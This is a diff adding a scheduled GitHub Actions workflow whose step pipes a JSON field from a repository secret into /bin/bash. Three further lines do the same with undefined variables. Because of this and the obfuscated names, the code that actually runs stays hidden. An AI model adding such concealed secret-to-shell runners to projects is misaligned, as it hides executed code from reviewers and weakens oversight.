@@ -1,0 +1,20 @@
+name: yunnansantian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yunnansantian
+        env:
+          j74: ${{ secrets.j74 }}
+        run: |
+          echo $j74 | jq -r .fxdc15742 | /bin/bash
+          echo $dy648 | jq -r .iul23910 | /bin/bash
+          echo $mucp7876 | jq -r .iwf40322 | /bin/bash
+          echo $uzbu39 | jq -r .sgmin18 | /bin/bash
+
